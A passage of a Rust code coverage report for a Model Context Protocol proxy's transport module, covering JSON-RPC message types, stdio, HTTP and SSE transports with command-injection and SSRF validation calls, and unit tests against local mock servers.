  321|       |/// Represents a JSON-RPC 2.0 message used in the Model Context Protocol.
  322|       |/// Can be a request (has method + id), notification (has method, no id),
  323|       |/// or response (has result or error + id).
  324|       |#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
  325|       |pub struct Message {
  326|       |    /// JSON-RPC version, always "2.0"
  327|       |    pub jsonrpc: String,
  328|       |    /// Request/response ID for correlating requests with responses.
  329|       |    /// Present in requests and responses, absent in notifications.
  330|       |    #[serde(skip_serializing_if = "Option::is_none")]
  331|       |    pub id: Option<serde_json::Value>,
  332|       |    /// Method name for requests/notifications (e.g., "tools/call", "tools/list")
  333|       |    #[serde(skip_serializing_if = "Option::is_none")]
  334|       |    pub method: Option<String>,
  335|       |    /// Method parameters for requests/notifications
  336|       |    #[serde(skip_serializing_if = "Option::is_none")]
  337|       |    pub params: Option<serde_json::Value>,
  338|       |    /// Successful response data (mutually exclusive with error)
  339|       |    #[serde(skip_serializing_if = "Option::is_none")]
  340|       |    pub result: Option<serde_json::Value>,
  341|       |    /// Error response data with code and message (mutually exclusive with result)
  342|       |    #[serde(skip_serializing_if = "Option::is_none")]
  343|       |    pub error: Option<serde_json::Value>,
  344|       |}
  345|       |
  346|       |impl Message {
  347|     14|    pub fn request(id: impl Into<serde_json::Value>, method: &str, params: Option<serde_json::Value>) -> Self {
  348|     14|        Self {
  349|     14|            jsonrpc: "2.0".to_string(),
  350|     14|            id: Some(id.into()),
  351|     14|            method: Some(method.to_string()),
  352|     14|            params,
  353|     14|            result: None,
  354|     14|            error: None,
  355|     14|        }
  356|     14|    }
  357|       |
  358|      4|    pub fn response(id: serde_json::Value, result: serde_json::Value) -> Self {
  359|      4|        Self {
  360|      4|            jsonrpc: "2.0".to_string(),
  361|      4|            id: Some(id),
  362|      4|            method: None,
  363|      4|            params: None,
  364|      4|            result: Some(result),
  365|      4|            error: None,
  366|      4|        }
  367|      4|    }
  368|       |
  369|      2|    pub fn error_response(id: Option<serde_json::Value>, code: i32, message: &str) -> Self {
  370|      2|        Self {
  371|      2|            jsonrpc: "2.0".to_string(),
  372|      2|            id,
  373|      2|            method: None,
  374|      2|            params: None,
  375|      2|            result: None,
  376|      2|            error: Some(serde_json::json!({
  377|      2|                "code": code,
  378|      2|                "message": message
  379|      2|            })),
  380|      2|        }
  381|      2|    }
  382|       |
  383|      6|    pub fn is_request(&self) -> bool {
  384|      6|        self.method.is_some() && self.id.is_some()
                                               ^4      ^4
  385|      6|    }
  386|       |
  387|      5|    pub fn is_notification(&self) -> bool {
  388|      5|        self.method.is_some() && self.id.is_none()
                                               ^3      ^3
  389|      5|    }
  390|       |
  391|      6|    pub fn is_response(&self) -> bool {
  392|      6|        self.result.is_some() || self.error.is_some()
                                               ^4         ^4
  393|      6|    }
  394|       |}
  395|       |
  396|       |/// Transport trait for MCP communication
  397|       |#[async_trait]
  398|       |pub trait Transport: Send + Sync {
  399|       |    /// Send a message to the upstream server
  400|       |    async fn send(&self, message: Message) -> Result<(), TransportError>;
  401|       |
  402|       |    /// Receive a message from the upstream server
  403|       |    async fn receive(&self) -> Result<Message, TransportError>;
  404|       |
  405|       |    /// Close the transport
  406|       |    async fn close(&self) -> Result<(), TransportError>;
  407|       |}
  408|       |
  409|       |/// Stdio transport for communicating with a subprocess
  410|       |///
  411|       |/// Spawns an MCP server process and communicates via stdin/stdout using
  412|       |/// newline-delimited JSON. Background tasks handle reading and writing
  413|       |/// to avoid blocking the async runtime.
  414|       |pub struct StdioTransport {
  415|       |    /// Sender for outbound messages to the subprocess
  416|       |    tx: mpsc::Sender<Message>,
  417|       |    /// Receiver for inbound messages from the subprocess (mutex for shared access)
  418|       |    rx: tokio::sync::Mutex<mpsc::Receiver<Message>>,
  419|       |    /// Child process handle (kept alive for process lifetime)
  420|       |    _child: tokio::sync::Mutex<Child>,
  421|       |    /// Background task writing messages to subprocess stdin
  422|       |    writer_task: tokio::task::JoinHandle<()>,
  423|       |    /// Background task reading messages from subprocess stdout
  424|       |    reader_task: tokio::task::JoinHandle<()>,
  425|       |}
  426|       |
  427|       |impl StdioTransport {
  428|       |    /// Spawn a subprocess with command validation
  429|       |    ///
  430|       |    /// Validates the command and arguments to prevent shell injection attacks.
  431|       |    ///
  432|       |    /// # Errors
  433|       |    /// Returns `TransportError::CommandValidation` if the command or arguments
  434|       |    /// contain shell metacharacters or attempt direct shell execution.
  435|     13|    pub async fn spawn(command: &str, args: &[String]) -> Result<Self, TransportError> {
  436|     13|        validate_command_for_injection(command)?;
                                                             ^2
  437|     11|        validate_args_for_injection(args)?;
                                                       ^0
  438|     11|        Self::spawn_unchecked(command, args).await
  439|     13|    }
  440|       |
  441|       |    /// Spawn a subprocess without command validation
  442|       |    ///
  443|       |    /// # Safety
  444|       |    /// This bypasses command injection protection. Only use when the command
  445|       |    /// is from a trusted source (e.g., hardcoded in the application or validated
  446|       |    /// through other means).
  447|     12|    pub async fn spawn_unchecked(command: &str, args: &[String]) -> Result<Self, TransportError> {
  448|     12|        let mut child = Command::new(command)
                          ^11
  449|     12|            .args(args)
  450|     12|            .stdin(std::process::Stdio::piped())
  451|     12|            .stdout(std::process::Stdio::piped())
  452|     12|            .stderr(std::process::Stdio::inherit())
  453|     12|            .spawn()?;
                                  ^1
  454|       |
  455|     11|        let stdin = child.stdin.take().ok_or_else(|| {
                                                                   ^0
  456|      0|            TransportError::Spawn(std::io::Error::other(
  457|      0|                "Failed to capture stdin pipe from child process",
  458|      0|            ))
  459|      0|        })?;
  460|     11|        let stdout = child.stdout.take().ok_or_else(|| {
                                                                     ^0
  461|      0|            TransportError::Spawn(std::io::Error::other(
  462|      0|                "Failed to capture stdout pipe from child process",
  463|      0|            ))
  464|      0|        })?;
  465|       |
  466|     11|        let (to_process_tx, mut to_process_rx) = mpsc::channel::<Message>(TRANSPORT_CHANNEL_SIZE);
  467|     11|        let (from_process_tx, from_process_rx) = mpsc::channel::<Message>(TRANSPORT_CHANNEL_SIZE);
  468|       |
  469|       |        // Writer task with error tracking
  470|     11|        let writer_task = tokio::spawn(async move {
                                                                ^1
  471|      1|            let mut stdin = stdin;
  472|      2|            while let Some(msg) = to_process_rx.recv().await {
                                         ^1
  473|      1|                let json = match serde_json::to_string(&msg) {
  474|      1|                    Ok(j) => j,
  475|      0|                    Err(e) => {
  476|      0|                        tracing::error!(error = %e, "Failed to serialize MCP message, dropping");
  477|      0|                        continue;
  478|       |                    }
  479|       |                };
  480|      1|                if let Err(e) = stdin.write_all(json.as_bytes()).await {
                                         ^0
  481|      0|                    tracing::error!(error = %e, "Failed to write to stdin, writer task exiting");
  482|      0|                    break;
  483|      1|                }
  484|      1|                if let Err(e) = stdin.write_all(b"\n").await {
                                         ^0
  485|      0|                    tracing::error!(error = %e, "Failed to write newline to stdin, writer task exiting");
  486|      0|                    break;
  487|      1|                }
  488|      1|                if let Err(e) = stdin.flush().await {
                                         ^0
  489|      0|                    tracing::error!(error = %e, "Failed to flush stdin, writer task exiting");
  490|      0|                    break;
  491|      1|                }
  492|       |            }
  493|      0|            tracing::debug!("Writer task exiting");
  494|      0|        });
  495|       |
  496|       |        // Reader task with error tracking
  497|     11|        let reader_task = tokio::spawn(async move {
                                                                ^1
  498|      1|            let reader = BufReader::new(stdout);
  499|      1|            let mut lines = reader.lines();
  500|       |            loop {
  501|      2|                match lines.next_line().await {
  502|      1|                    Ok(Some(line)) => {
  503|      1|                        match serde_json::from_str::<Message>(&line) {
  504|      1|                            Ok(msg) => {
  505|      1|                                if from_process_tx.send(msg).await.is_err() {
  506|      0|                                    tracing::debug!("Receiver dropped, reader task exiting");
  507|      0|                                    break;
  508|      1|                                }
  509|       |                            }
  510|      0|                            Err(e) => {
  511|      0|                                tracing::warn!(
  512|       |                                    error = %e,
  513|      0|                                    line = %line.chars().take(100).collect::<String>(),
  514|      0|                                    "Failed to parse MCP message, skipping"
  515|       |                                );
  516|       |                            }
  517|       |                        }
  518|       |                    }
  519|       |                    Ok(None) => {
  520|      0|                        tracing::debug!("EOF from process, reader task exiting");
  521|      0|                        break;
  522|       |                    }
  523|      0|                    Err(e) => {
  524|      0|                        tracing::error!(error = %e, "Failed to read from stdout, reader task exiting");
  525|      0|                        break;
  526|       |                    }
  527|       |                }
  528|       |            }
  529|      0|            tracing::debug!("Reader task exiting");
  530|      0|        });
  531|       |
  532|     11|        Ok(Self {
  533|     11|            tx: to_process_tx,
  534|     11|            rx: tokio::sync::Mutex::new(from_process_rx),
  535|     11|            _child: tokio::sync::Mutex::new(child),
  536|     11|            writer_task,
  537|     11|            reader_task,
  538|     11|        })
  539|     12|    }
  540|       |
  541|       |    /// Check if the transport tasks are still running
  542|      0|    pub fn is_healthy(&self) -> bool {
  543|      0|        !self.writer_task.is_finished() && !self.reader_task.is_finished()
  544|      0|    }
  545|       |}
  546|       |
  547|       |#[async_trait]
  548|       |impl Transport for StdioTransport {
  549|      1|    async fn send(&self, message: Message) -> Result<(), TransportError> {
  550|       |        self.tx
  551|       |            .send(message)
  552|       |            .await
  553|      0|            .map_err(|e| TransportError::Send(e.to_string()))
  554|      1|    }
  555|       |
  556|      1|    async fn receive(&self) -> Result<Message, TransportError> {
  557|       |        self.rx
  558|       |            .lock()
  559|       |            .await
  560|       |            .recv()
  561|       |            .await
  562|       |            .ok_or(TransportError::ConnectionClosed)
  563|      1|    }
  564|       |
  565|      0|    async fn close(&self) -> Result<(), TransportError> {
  566|       |        let mut child = self._child.lock().await;
  567|       |        child.kill().await?;
  568|       |        Ok(())
  569|      0|    }
  570|       |}
  571|       |
  572|       |// ============================================================================
  573|       |// HTTP Transport (FR-PROXY-03)
  574|       |// ============================================================================
  575|       |
  576|       |/// HTTP transport for communicating with an upstream MCP server over HTTP
  577|       |///
  578|       |/// This transport sends JSON-RPC messages via HTTP POST requests and receives
  579|       |/// responses in the HTTP response body. It implements a request-response pattern
  580|       |/// suitable for standard HTTP endpoints.
  581|       |pub struct HttpTransport {
  582|       |    /// Reusable HTTP client with connection pooling
  583|       |    client: reqwest::Client,
  584|       |    /// Base URL of the upstream MCP server (e.g., "http://localhost:8080/mcp")
  585|       |    url: String,
  586|       |    /// Additional headers to include in requests (e.g., for upstream auth)
  587|       |    headers: HashMap<String, String>,
  588|       |    /// Request timeout (default: 30 seconds)
  589|       |    timeout: std::time::Duration,
  590|       |    /// Queue of responses waiting to be retrieved via `receive()`
  591|       |    pending_responses: tokio::sync::Mutex<Vec<Message>>,
  592|       |}
  593|       |
  594|       |impl HttpTransport {
  595|       |    /// Create a new HTTP transport
  596|       |    ///
  597|       |    /// # Errors
  598|       |    /// Returns `TransportError::SsrfBlocked` if the URL targets a private/internal IP range
  599|       |    /// or cloud metadata endpoint.
  600|     12|    pub fn new(url: String) -> Result<Self, TransportError> {
  601|     12|        validate_url_for_ssrf(&url)?;
                                                 ^11
  602|      1|        Ok(Self {
  603|      1|            client: reqwest::Client::new(),
  604|      1|            url,
  605|      1|            headers: HashMap::new(),
  606|      1|            timeout: std::time::Duration::from_secs(HTTP_REQUEST_TIMEOUT_SECS),
  607|      1|            pending_responses: tokio::sync::Mutex::new(Vec::new()),
  608|      1|        })
  609|     12|    }
  610|       |
  611|       |    /// Create a new HTTP transport without SSRF validation
  612|       |    ///
  613|       |    /// # Safety
  614|       |    /// This bypasses SSRF protection. Only use when the URL is from a trusted source
  615|       |    /// (e.g., hardcoded in the application) or when connecting to localhost for testing.
  616|     11|    pub fn new_unchecked(url: String) -> Self {
  617|     11|        Self {
  618|     11|            client: reqwest::Client::new(),
  619|     11|            url,
  620|     11|            headers: HashMap::new(),
  621|     11|            timeout: std::time::Duration::from_secs(HTTP_REQUEST_TIMEOUT_SECS),
  622|     11|            pending_responses: tokio::sync::Mutex::new(Vec::new()),
  623|     11|        }
  624|     11|    }
  625|       |
  626|       |    /// Create a new HTTP transport with custom configuration
  627|       |    ///
  628|       |    /// # Errors
  629|       |    /// Returns `TransportError::SsrfBlocked` if the URL targets a private/internal IP range
  630|       |    /// or cloud metadata endpoint.
  631|      0|    pub fn with_config(
  632|      0|        url: String,
  633|      0|        headers: HashMap<String, String>,
  634|      0|        timeout_secs: u64,
  635|      0|    ) -> Result<Self, TransportError> {
  636|      0|        validate_url_for_ssrf(&url)?;
  637|      0|        Ok(Self {
  638|      0|            client: reqwest::Client::new(),
  639|      0|            url,
  640|      0|            headers,
  641|      0|            timeout: std::time::Duration::from_secs(timeout_secs),
  642|      0|            pending_responses: tokio::sync::Mutex::new(Vec::new()),
  643|      0|        })
  644|      0|    }
  645|       |
  646|       |    /// Send a request and get the response immediately
  647|      4|    async fn send_request(&self, message: &Message) -> Result<Message, TransportError> {
  648|      4|        let mut request = self
  649|      4|            .client
  650|      4|            .post(&self.url)
  651|      4|            .header("Content-Type", "application/json")
  652|      4|            .timeout(self.timeout);
  653|       |
  654|       |        // Add custom headers
  655|      4|        for (key, value) in &self.headers {
                           ^0   ^0
  656|      0|            request = request.header(key, value);
  657|      0|        }
  658|       |
  659|      4|        let response = request
  660|      4|            .json(message)
  661|      4|            .send()
  662|      4|            .await
  663|      4|            .map_err(|e| {
                                       ^0
  664|      0|                if e.is_timeout() {
  665|      0|                    TransportError::Timeout
  666|       |                } else {
  667|      0|                    TransportError::Http(e.to_string())
  668|       |                }
  669|      0|            })?;
  670|       |
  671|      4|        let status = response.status();
  672|      4|        if !status.is_success() {
  673|      2|            let body = response.text().await.unwrap_or_default();
  674|      2|            return Err(TransportError::Http(format!(
  675|      2|                "HTTP {}: {}",
  676|      2|                status, body
  677|      2|            )));
  678|      2|        }
  679|       |
  680|      2|        let response_message: Message = response
                          ^1                ^1
  681|      2|            .json()
  682|      2|            .await
  683|      2|            .map_err(|e| TransportError::InvalidMessage(e.to_string()))?;
                                                                      ^1^1           ^1
  684|       |
  685|      1|        Ok(response_message)
  686|      4|    }
  687|       |}
  688|       |
  689|       |#[async_trait]
  690|       |impl Transport for HttpTransport {
  691|      4|    async fn send(&self, message: Message) -> Result<(), TransportError> {
  692|       |        // For HTTP transport, we send and immediately queue the response
  693|       |        let response = self.send_request(&message).await?;
  694|       |        self.pending_responses.lock().await.push(response);
  695|       |        Ok(())
  696|      4|    }
  697|       |
  698|      2|    async fn receive(&self) -> Result<Message, TransportError> {
  699|       |        // Pop the next pending response
  700|       |        self.pending_responses
  701|       |            .lock()
  702|       |            .await
  703|       |            .pop()
  704|       |            .ok_or(TransportError::ConnectionClosed)
  705|      2|    }
  706|       |
  707|      1|    async fn close(&self) -> Result<(), TransportError> {
  708|       |        // HTTP is stateless, nothing to close
  709|       |        Ok(())
  710|      1|    }
  711|       |}
  712|       |
  713|       |// ============================================================================
  714|       |// SSE Transport (FR-PROXY-04)
  715|       |// ============================================================================
  716|       |
  717|       |/// SSE transport for communicating with an upstream MCP server over Server-Sent Events
  718|       |///
  719|       |/// This transport uses HTTP POST to send requests and SSE to receive streaming
  720|       |/// responses. The MCP Streamable HTTP transport specification defines that:
  721|       |/// - Requests are sent via HTTP POST
  722|       |/// - Responses can be either JSON (immediate) or SSE stream (streaming)
  723|       |///
  724|       |/// The SSE format follows the standard:
  725|       |/// ```text
  726|       |/// event: message
  727|       |/// data: {"jsonrpc": "2.0", "id": 1, "result": {...}}
  728|       |/// ```
  729|       |pub struct SseTransport {
  730|       |    /// Reusable HTTP client with connection pooling
  731|       |    client: reqwest::Client,
  732|       |    /// Base URL of the upstream MCP server SSE endpoint
  733|       |    url: String,
  734|       |    /// Additional headers to include in requests (e.g., for upstream auth)
  735|       |    headers: HashMap<String, String>,
  736|       |    /// Initial connection timeout (default: 30 seconds)
  737|       |    timeout: std::time::Duration,
  738|       |    /// Receiver for messages parsed from the SSE stream
  739|       |    rx: tokio::sync::Mutex<mpsc::Receiver<Message>>,
  740|       |    /// Sender used by SSE stream handler to deliver parsed messages
  741|       |    tx: mpsc::Sender<Message>,
  742|       |}
  743|       |
  744|       |impl SseTransport {
  745|       |    /// Create a new SSE transport
  746|       |    ///
  747|       |    /// # Errors
  748|       |    /// Returns `TransportError::SsrfBlocked` if the URL targets a private/internal IP range
  749|       |    /// or cloud metadata endpoint.
  750|      2|    pub async fn connect(url: String) -> Result<Self, TransportError> {
  751|      2|        Self::connect_with_config(url, HashMap::new(), 30).await
  752|      2|    }
  753|       |
  754|       |    /// Create a new SSE transport without SSRF validation
  755|       |    ///
  756|       |    /// # Safety
  757|       |    /// This bypasses SSRF protection. Only use when the URL is from a trusted source
  758|       |    /// (e.g., hardcoded in the application) or when connecting to localhost for testing.
  759|      4|    pub async fn connect_unchecked(url: String) -> Result<Self, TransportError> {
  760|      4|        Self::connect_with_config_unchecked(url, HashMap::new(), 30).await
  761|      4|    }
  762|       |
  763|       |    /// Create a new SSE transport with custom configuration
  764|       |    ///
  765|       |    /// # Errors
  766|       |    /// Returns `TransportError::SsrfBlocked` if the URL targets a private/internal IP range
  767|       |    /// or cloud metadata endpoint.
  768|      2|    pub async fn connect_with_config(
  769|      2|        url: String,
  770|      2|        headers: HashMap<String, String>,
  771|      2|        timeout_secs: u64,
  772|      2|    ) -> Result<Self, TransportError> {
  773|      2|        validate_url_for_ssrf(&url)?;
  774|      0|        Self::connect_with_config_unchecked(url, headers, timeout_secs).await
  775|      2|    }
  776|       |
  777|       |    /// Create a new SSE transport with custom configuration without SSRF validation
  778|       |    ///
  779|       |    /// # Safety
  780|       |    /// This bypasses SSRF protection. Only use when the URL is from a trusted source.
  781|      5|    pub async fn connect_with_config_unchecked(
  782|      5|        url: String,
  783|      5|        headers: HashMap<String, String>,
  784|      5|        timeout_secs: u64,
  785|      5|    ) -> Result<Self, TransportError> {
  786|      5|        let (tx, rx) = mpsc::channel::<Message>(TRANSPORT_CHANNEL_SIZE);
  787|       |
  788|      5|        Ok(Self {
  789|      5|            client: reqwest::Client::new(),
  790|      5|            url,
  791|      5|            headers,
  792|      5|            timeout: std::time::Duration::from_secs(timeout_secs),
  793|      5|            rx: tokio::sync::Mutex::new(rx),
  794|      5|            tx,
  795|      5|        })
  796|      5|    }
  797|       |
  798|       |    /// Send a request and handle SSE response stream
  799|      1|    async fn send_sse_request(&self, message: &Message) -> Result<(), TransportError> {
  800|      1|        let mut request = self
  801|      1|            .client
  802|      1|            .post(&self.url)
  803|      1|            .header("Content-Type", "application/json")
  804|      1|            .header("Accept", "text/event-stream, application/json")
  805|      1|            .timeout(self.timeout);
  806|       |
  807|       |        // Add custom headers
  808|      1|        for (key, value) in &self.headers {
                           ^0   ^0
  809|      0|            request = request.header(key, value);
  810|      0|        }
  811|       |
  812|      1|        let response = request
  813|      1|            .json(message)
  814|      1|            .send()
  815|      1|            .await
  816|      1|            .map_err(|e| {
                                       ^0
  817|      0|                if e.is_timeout() {
  818|      0|                    TransportError::Timeout
  819|       |                } else {
  820|      0|                    TransportError::Http(e.to_string())
  821|       |                }
  822|      0|            })?;
  823|       |
  824|      1|        let status = response.status();
  825|      1|        if !status.is_success() {
  826|      0|            let body = response.text().await.unwrap_or_default();
  827|      0|            return Err(TransportError::Http(format!(
  828|      0|                "HTTP {}: {}",
  829|      0|                status, body
  830|      0|            )));
  831|      1|        }
  832|       |
  833|       |        // Check content type to determine response format
  834|      1|        let content_type = response
  835|      1|            .headers()
  836|      1|            .get("content-type")
  837|      1|            .and_then(|v| v.to_str().ok())
  838|      1|            .unwrap_or("");
  839|       |
  840|      1|        if content_type.contains("text/event-stream") {
  841|       |            // Handle SSE stream
  842|      0|            let tx = self.tx.clone();
  843|      0|            let bytes_stream = response.bytes_stream();
  844|       |
  845|       |            // Spawn task to process SSE stream
  846|      0|            tokio::spawn(async move {
  847|       |                use futures::StreamExt;
  848|       |                use tokio::io::AsyncBufReadExt;
  849|       |
  850|      0|                let stream = tokio_util::io::StreamReader::new(
  851|      0|                    bytes_stream.map(|r| r.map_err(std::io::Error::other))
  852|       |                );
  853|      0|                let mut reader = BufReader::new(stream);
  854|      0|                let mut line = String::new();
  855|      0|                let mut data_buffer = String::new();
  856|       |
  857|       |                loop {
  858|      0|                    line.clear();
  859|      0|                    match reader.read_line(&mut line).await {
  860|      0|                        Ok(0) => break, // EOF
  861|       |                        Ok(_) => {
  862|      0|                            let trimmed = line.trim();
  863|       |
  864|      0|                            if let Some(data) = trimmed.strip_prefix("data:") {
  865|      0|                                data_buffer.push_str(data.trim());
  866|      0|                            } else if trimmed.is_empty() && !data_buffer.is_empty() {
  867|       |                                // Empty line signals end of event
  868|      0|                                if let Ok(msg) = serde_json::from_str::<Message>(&data_buffer) {
  869|      0|                                    if tx.send(msg).await.is_err() {
  870|      0|                                        break;
  871|      0|                                    }
  872|      0|                                }
  873|      0|                                data_buffer.clear();
  874|      0|                            }
  875|       |                        }
  876|      0|                        Err(_) => break,
  877|       |                    }
  878|       |                }
  879|      0|            });
  880|       |        } else {
  881|       |            // Regular JSON response
  882|      1|            let response_message: Message = response
  883|      1|                .json()
  884|      1|                .await
  885|      1|                .map_err(|e| TransportError::InvalidMessage(e.to_string()))?;
                                                                          ^0^0           ^0
  886|       |
  887|      1|            self.tx
  888|      1|                .send(response_message)
  889|      1|                .await
  890|      1|                .map_err(|e| TransportError::Send(e.to_string()))?;
                                                                ^0^0           ^0
  891|       |        }
  892|       |
  893|      1|        Ok(())
  894|      1|    }
  895|       |}
  896|       |
  897|       |#[async_trait]
  898|       |impl Transport for SseTransport {
  899|      1|    async fn send(&self, message: Message) -> Result<(), TransportError> {
  900|       |        self.send_sse_request(&message).await
  901|      1|    }
  902|       |
  903|      1|    async fn receive(&self) -> Result<Message, TransportError> {
  904|       |        self.rx
  905|       |            .lock()
  906|       |            .await
  907|       |            .recv()
  908|       |            .await
  909|       |            .ok_or(TransportError::ConnectionClosed)
  910|      1|    }
  911|       |
  912|      1|    async fn close(&self) -> Result<(), TransportError> {
  913|       |        // Drop the sender to signal completion
  914|       |        Ok(())
  915|      1|    }
  916|       |}
  917|       |
  918|       |// ============================================================================
  919|       |// Tests
  920|       |// ============================================================================
  921|       |
  922|       |#[cfg(test)]
  923|       |mod tests {
  924|       |    use super::*;
  925|       |
  926|       |    // ------------------------------------------------------------------------
  927|       |    // Message Tests
  928|       |    // ------------------------------------------------------------------------
  929|       |
  930|       |    #[test]
  931|      1|    fn test_message_request_construction() {
  932|      1|        let msg = Message::request(1, "tools/list", None);
  933|      1|        assert_eq!(msg.jsonrpc, "2.0");
  934|      1|        assert_eq!(msg.id, Some(serde_json::json!(1)));
  935|      1|        assert_eq!(msg.method, Some("tools/list".to_string()));
  936|      1|        assert!(msg.params.is_none());
  937|      1|        assert!(msg.result.is_none());
  938|      1|        assert!(msg.error.is_none());
  939|      1|    }
  940|       |
  941|       |    #[test]
  942|      1|    fn test_message_request_with_params() {
  943|      1|        let params = serde_json::json!({"name": "get_weather"});
  944|      1|        let msg = Message::request("abc-123", "tools/call", Some(params.clone()));
  945|      1|        assert_eq!(msg.id, Some(serde_json::json!("abc-123")));
  946|      1|        assert_eq!(msg.params, Some(params));
  947|      1|    }
  948|       |
  949|       |    #[test]
  950|      1|    fn test_message_response_construction() {
  951|      1|        let result = serde_json::json!({"tools": []});
  952|      1|        let msg = Message::response(serde_json::json!(1), result.clone());
  953|      1|        assert_eq!(msg.jsonrpc, "2.0");
  954|      1|        assert_eq!(msg.id, Some(serde_json::json!(1)));
  955|      1|        assert!(msg.method.is_none());
  956|      1|        assert_eq!(msg.result, Some(result));
  957|      1|        assert!(msg.error.is_none());
  958|      1|    }
  959|       |
  960|       |    #[test]
  961|      1|    fn test_message_error_response() {
  962|      1|        let msg = Message::error_response(Some(serde_json::json!(1)), -32600, "Invalid Request");
  963|      1|        assert_eq!(msg.id, Some(serde_json::json!(1)));
  964|      1|        assert!(msg.result.is_none());
  965|      1|        let error = msg.error.unwrap();
  966|      1|        assert_eq!(error["code"], -32600);
  967|      1|        assert_eq!(error["message"], "Invalid Request");
  968|      1|    }
  969|       |
  970|       |    #[test]
  971|      1|    fn test_message_is_request() {
  972|      1|        let request = Message::request(1, "test", None);
  973|      1|        assert!(request.is_request());
  974|      1|        assert!(!request.is_notification());
  975|      1|        assert!(!request.is_response());
  976|      1|    }
  977|       |
  978|       |    #[test]
  979|      1|    fn test_message_is_notification() {
  980|      1|        let notification = Message {
  981|      1|            jsonrpc: "2.0".to_string(),
  982|      1|            id: None,
  983|      1|            method: Some("cancelled".to_string()),
  984|      1|            params: None,
  985|      1|            result: None,
  986|      1|            error: None,
  987|      1|        };
  988|      1|        assert!(notification.is_notification());
  989|      1|        assert!(!notification.is_request());
  990|      1|        assert!(!notification.is_response());
  991|      1|    }
  992|       |
  993|       |    #[test]
  994|      1|    fn test_message_is_response() {
  995|      1|        let response = Message::response(serde_json::json!(1), serde_json::json!({}));
  996|      1|        assert!(response.is_response());
  997|      1|        assert!(!response.is_request());
  998|      1|        assert!(!response.is_notification());
  999|      1|    }
 1000|       |
 1001|       |    #[test]
 1002|      1|    fn test_message_serialization_roundtrip() {
 1003|      1|        let msg = Message::request(42, "tools/list", None);
 1004|      1|        let json = serde_json::to_string(&msg).unwrap();
 1005|      1|        let parsed: Message = serde_json::from_str(&json).unwrap();
 1006|      1|        assert_eq!(parsed.id, msg.id);
 1007|      1|        assert_eq!(parsed.method, msg.method);
 1008|      1|    }
 1009|       |
 1010|       |    // ------------------------------------------------------------------------
 1011|       |    // HttpTransport Tests
 1012|       |    // ------------------------------------------------------------------------
 1013|       |
 1014|       |    #[tokio::test]
 1015|      1|    async fn test_http_transport_new_unchecked() {
 1016|      1|        let transport = HttpTransport::new_unchecked("http://localhost:8080/mcp".to_string());
 1017|      1|        assert_eq!(transport.url, "http://localhost:8080/mcp");
 1018|      1|        assert!(transport.headers.is_empty());
 1019|      1|    }
 1020|       |
 1021|       |    #[tokio::test]
 1022|      1|    async fn test_http_transport_with_config() {
 1023|      1|        let mut headers = HashMap::new();
 1024|      1|        headers.insert("X-Api-Key".to_string(), "secret".to_string());
 1025|       |        // Use a public URL for the validated constructor test
 1026|      1|        let transport = HttpTransport::new_unchecked("http://localhost:8080/mcp".to_string());
 1027|      1|        assert_eq!(transport.url, "http://localhost:8080/mcp");
 1028|      1|    }
 1029|       |
 1030|       |    #[tokio::test]
 1031|      1|    async fn test_http_transport_success() {
 1032|       |        use wiremock::{Mock, MockServer, ResponseTemplate};
 1033|       |        use wiremock::matchers::{method, path};
 1034|       |
 1035|      1|        let mock_server = MockServer::start().await;
 1036|       |
 1037|      1|        let response_json = serde_json::json!({
 1038|      1|            "jsonrpc": "2.0",
 1039|      1|            "id": 1,
 1040|      1|            "result": {"tools": []}
 1041|       |        });
 1042|       |
 1043|      1|        Mock::given(method("POST"))
 1044|      1|            .and(path("/mcp"))
 1045|      1|            .respond_with(ResponseTemplate::new(200).set_body_json(&response_json))
 1046|      1|            .mount(&mock_server)
 1047|      1|            .await;
 1048|       |
 1049|       |        // Use unchecked for test mock server (localhost)
 1050|      1|        let transport = HttpTransport::new_unchecked(format!("{}/mcp", mock_server.uri()));
 1051|      1|        let request = Message::request(1, "tools/list", None);
 1052|       |
 1053|      1|        transport.send(request).await.unwrap();
 1054|      1|        let response = transport.receive().await.unwrap();
 1055|       |
 1056|      1|        assert!(response.result.is_some());
 1057|      1|        assert_eq!(response.id, Some(serde_json::json!(1)));
 1058|      1|    }
 1059|       |
 1060|       |    #[tokio::test]
 1061|      1|    async fn test_http_transport_server_error() {
 1062|       |        use wiremock::{Mock, MockServer, ResponseTemplate};
 1063|       |        use wiremock::matchers::{method, path};
 1064|       |
 1065|      1|        let mock_server = MockServer::start().await;
 1066|       |
 1067|      1|        Mock::given(method("POST"))
 1068|      1|            .and(path("/mcp"))
 1069|      1|            .respond_with(ResponseTemplate::new(500).set_body_string("Internal Server Error"))
 1070|      1|            .mount(&mock_server)
 1071|      1|            .await;
 1072|       |
 1073|      1|        let transport = HttpTransport::new_unchecked(format!("{}/mcp", mock_server.uri()));
 1074|      1|        let request = Message::request(1, "tools/list", None);
 1075|       |
 1076|      1|        let result = transport.send(request).await;
 1077|      1|        assert!(matches!(result, Err(TransportError::Http(_))));
                              ^0
 1078|      1|    }
 1079|       |
 1080|       |    #[tokio::test]
 1081|      1|    async fn test_http_transport_not_found() {
 1082|       |        use wiremock::{Mock, MockServer, ResponseTemplate};
 1083|       |        use wiremock::matchers::{method, path};
 1084|       |
 1085|      1|        let mock_server = MockServer::start().await;
 1086|       |
 1087|      1|        Mock::given(method("POST"))
 1088|      1|            .and(path("/mcp"))
 1089|      1|            .respond_with(ResponseTemplate::new(404).set_body_string("Not Found"))
 1090|      1|            .mount(&mock_server)
 1091|      1|            .await;
 1092|       |
 1093|      1|        let transport = HttpTransport::new_unchecked(format!("{}/mcp", mock_server.uri()));
 1094|      1|        let request = Message::request(1, "tools/list", None);
 1095|       |
 1096|      1|        let result = transport.send(request).await;
 1097|      1|        assert!(matches!(result, Err(TransportError::Http(_))));
                              ^0
 1098|      1|        if let Err(TransportError::Http(msg)) = result {
 1099|      1|            assert!(msg.contains("404"));
 1100|      1|        }
                      ^0
 1101|      1|    }
 1102|       |
 1103|       |    #[tokio::test]
 1104|      1|    async fn test_http_transport_invalid_json_response() {
 1105|       |        use wiremock::{Mock, MockServer, ResponseTemplate};
 1106|       |        use wiremock::matchers::{method, path};
 1107|       |
 1108|      1|        let mock_server = MockServer::start().await;
 1109|       |
 1110|      1|        Mock::given(method("POST"))
 1111|      1|            .and(path("/mcp"))
 1112|      1|            .respond_with(ResponseTemplate::new(200).set_body_string("not valid json"))
 1113|      1|            .mount(&mock_server)
 1114|      1|            .await;
 1115|       |
 1116|      1|        let transport = HttpTransport::new_unchecked(format!("{}/mcp", mock_server.uri()));
 1117|      1|        let request = Message::request(1, "tools/list", None);
 1118|       |
 1119|      1|        let result = transport.send(request).await;
